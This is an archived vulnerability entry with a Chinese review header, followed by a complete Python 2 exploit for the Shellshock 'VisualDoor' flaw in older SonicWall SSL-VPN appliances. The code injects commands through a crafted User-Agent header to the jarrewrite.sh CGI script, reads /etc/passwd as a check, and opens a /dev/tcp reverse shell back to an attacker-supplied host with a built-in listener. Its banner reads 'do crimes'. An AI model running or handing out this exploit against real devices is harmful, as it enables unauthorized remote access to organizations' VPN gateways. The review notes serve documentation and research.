---
source: "白阁文库 BaizeSec/bylibrary"
id: "vw-4ce440c5962124f58c1b2f5f"
entity_id: "ve-4ce440c5962124f58c1b2f5f"
schema_version: "1"
title: "coding: utf-8"
product: "历史SonicWall SSL-VPN"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "旧Bash/CGI环境，未给固件；初始nobody，注释另述本地提权未实现"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/SonicWall/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

#!/usr/bin/python
# coding: utf-8

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：历史SonicWall SSL-VPN
- 本文讨论：VisualDoor jarrewrite.sh Shellshock；未编号
- 版本、权限与配置前提：旧Bash/CGI环境，未给固件；初始nobody，注释另述本地提权未实现
- 资料类型：裸Python2利用代码；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 整篇代码无代码围栏/标题/版本与修复说明，Python2依赖未标
- 代码自称Shellshock，与后续其他描述需统一根因；初始检查实际执行cat，不是无副作用指纹

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 适用型号/修复固件/准确CVE映射待原文核验，未执行
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->

```python
# Author: Darren Martyn
# Credit: Phineas Fisher
# Notes:
# This exploit basically implements the exploits Phineas Fisher used to pwn Hacking Team 
# and the Cayman Trust Bank place. It uses the Shellshock vulnerability to gain a command
# execution primitive as the "nobody" user in the cgi-bin/jarrewrite.sh web-script, spawns
# a trivial reverse shell using /dev/tcp.
# There is a fairly trivial LPE in these that gets you root by abusing setuid dos2unix, but
# implementing that is left as an exercise for the reader. I've seen a few approaches, and 
# would be interested in seeing yours.
# There is another LPE that works only on some models which I also have removed from this.
# Details: https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
import requests
import sys
import telnetlib
import socket
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import time

def banner():
    print """
                                                         
             88                                      88  
             ""                                      88  
                                                     88  
8b       d8  88  ,adPPYba,  88       88  ,adPPYYba,  88  
`8b     d8'  88  I8[    ""  88       88  ""     `Y8  88  
 `8b   d8'   88   `"Y8ba,   88       88  ,adPPPPP88  88  
  `8b,d8'    88  aa    ]8I  "8a,   ,a88  88,    ,88  88  
    "8"      88  `"YbbdP"'   `"YbbdP'Y8  `"8bbdP"Y8  88  
                                                         
                                                         
                                                         
             88                                          
             88                                          
             88                                          
     ,adPPYb,88   ,adPPYba,    ,adPPYba,   8b,dPPYba,    
    a8"    `Y88  a8"     "8a  a8"     "8a  88P'   "Y8    
    8b       88  8b       d8  8b       d8  88            
    "8a,   ,d88  "8a,   ,a8"  "8a,   ,a8"  88            
     `"8bbdP"Y8   `"YbbdP"'    `"YbbdP"'   88   
    SonicWall SSL-VPN Appliance Remote Exploit
Public Release (Jan 2021). Author: Darren Martyn. Credit
goes to Phineas Fisher for this. Stay inside, do crimes.
    """ 

def handler(lp): # handler borrowed from Stephen Seeley.
    print "(+) starting handler on port %d" %(lp)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print "(+) connection from %s" %(addr[0])
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()

def execute_command(target, command):
    url = target + "/cgi-bin/jarrewrite.sh"
    headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" %(command)}
    r = requests.get(url=url, headers=headers, verify=False)
    return r.text

def check_exploitable(target):
    print "(+) Testing %s for pwnability..." %(target)
    output = execute_command(target=target, command="cat /etc/passwd")
    if "root:" in output:
        print "(*) We can continue, time to wreck this shit."
        return True
    else:
        return False

def pop_reverse_shell(target, cb_host, cb_port):
    print "(+) Sending callback to %s:%s" %(cb_host, cb_port)
    backconnect = "nohup bash -i >& /dev/tcp/%s/%s 0>&1 &" %(cb_host, cb_port)
    execute_command(target=target, command=backconnect)

def hack_the_planet(target, cb_host, cb_port):
    if check_exploitable(target) == True:
        pass
    else:
        sys.exit("(-) Target not exploitable...")
    handlerthr = Thread(target=handler, args=(int(cb_port),))
    handlerthr.start()
    pop_reverse_shell(target=target, cb_host=cb_host, cb_port=cb_port)

def main(args):
    banner()
    if len(args) != 4:
        sys.exit("use: %s https://some-vpn.lol:8090 hacke.rs 1337" %(args[0]))
    hack_the_planet(target=args[1], cb_host=args[2], cb_port=args[3])

if __name__ == "__main__":
    main(args=sys.argv)

```

---

> 来源：白阁文库 BaizeSec/bylibrary
